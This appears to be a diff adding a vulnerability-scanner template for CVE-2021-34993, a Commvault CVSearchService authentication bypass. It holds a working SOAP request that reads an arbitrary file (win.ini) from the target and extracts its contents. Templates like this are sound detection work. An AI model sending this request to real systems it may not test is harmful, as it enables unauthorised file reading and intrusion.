@@ -1,0 +1,43 @@
+id: CVE-2021-34993
+info:
+  name: Commvault CVSearchService Authentication Bypass
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    Commvault CVSearchService is vulnerable to an authentication bypass vulnerability (CVE-2021-34993), allowing attackers to read arbitrary files by sending crafted SOAP requests.
+  classification:
+    cve-id: CVE-2021-34993
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: permission-bypass,auth-bypass,file-read
+
+http:
+  - raw:
+      - |
+        POST /SearchSvc/CVSearchService.svc HTTP/1.1
+        Host: {{Hostname}}:81
+        SOAPAction: "http://tempuri.org/ICVSearchSvc/downLoadFile"
+        Content-Type: text/xml
+        Content-Length: {{len(body)}}
+
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
+           <soapenv:Header/>
+           <soapenv:Body>
+              <tem:downLoadFile>
+                 <tem:path>C:/Windows/win.ini</tem:path>
+              </tem:downLoadFile>
+           </soapenv:Body>
+        </soapenv:Envelope>
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: regex
+        regex:
+          - "<downLoadFileResponse xmlns=\"http://tempuri.org/\""
+    extractors:
+      - type: regex
+        group: 1
+        regex:
+          - "<downLoadFileResult>(.*?)</downLoadFileResult>"
